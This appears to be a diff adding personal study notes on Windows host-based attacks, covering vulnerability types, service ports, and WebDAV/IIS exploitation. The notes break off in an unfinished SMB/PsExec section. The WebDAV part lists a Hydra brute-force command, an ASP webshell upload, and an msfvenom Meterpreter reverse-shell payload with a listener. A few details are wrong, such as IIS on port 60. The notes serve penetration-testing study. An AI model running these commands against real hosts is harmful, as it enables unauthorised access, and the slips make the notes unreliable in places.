@@ -1,0 +1,68 @@
+Host Based attacks
+
+- Introduction to host based attacks
+    - Attacks targeted to towards a specific system or host running a specific operating system
+    - These attacks are focused on exploiting inherent vulnerabilites on the target OS 
+
+Windows Vulnerabilities
+
+- Overview of Windows vulnerabilities
+    - Windows is the dominant operating system (>= 70% market share)
+    - Popular vulns: EternalBlue, Conflicker
+    - Windows OS's have benn developed in the C programming language, making them vulnerable to buffer overflows
+    - By default, Windows is not configured to run securely
+    - New vulnerabilities are not patched immediately
+    - Types of Windows vulnerabilities:
+        1. Information disclosure
+        2. Buffer overflows
+        3. Remote code execution (RCE)
+        4. Privilege escalation 
+        5. Denial of Service
+    
+- Frequently exploited Windows services
+    - Windows has various native services and protocols that can be run on a host
+    - Microsoft IIS
+        - Web server technology
+        - TCP port 60 or 443
+    - WebDAV
+        - HTTP extension that allows clients to modify files on a web server
+        - TCP port 80 or 443
+    - SMB/CIFS
+        - Network file sharing 
+        - TCP port 445
+    - RDP (Remote Desktop Protocol)
+        - GUI remote access protocol 
+        - TCP port 3389
+    - WinRM
+        - Windows remote management protocol for remote access 
+        - TCP port 5986 or 443
+
+- Exploiting WebDav running in Microsoft IIS
+    - ASP.NET or php
+    - TCP port 80 or 443
+    - WebDAV is used for manage files collaboratively
+    - Check if WebDAV is running
+    - Bruteforce credentials
+    - Upload malicious .asp file to gain access to the server
+        - /usr/share/webshells/asp/webshell.asp
+    - davtest, cadaver
+        - davtest -auth user:pass -url http://<ip>/webdav +
+        - cadaver http://<ip>/webdav
+    - Hydra can be used to brute force credentials
+        - hydra -L <users> -P <passwords> <ip> http-get <path to webdav>
+
+- Exploiting WebDAV with metasploit
+    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f asp > shell.asp
+    - in msfconsole:
+        - use multi/handler
+
+- Exploiting SMB with PsExec
+    - SMB authentication
+        - Authentication req -->
+        - Encrypt string with user's hash <--
+        - Encrypted string -->
+        - Access granted <--
+    - PsExec is a telnet replacement that allows to execute processes on remote windows systems
+    - PsExec uses SMB authentication
+    -   
+    
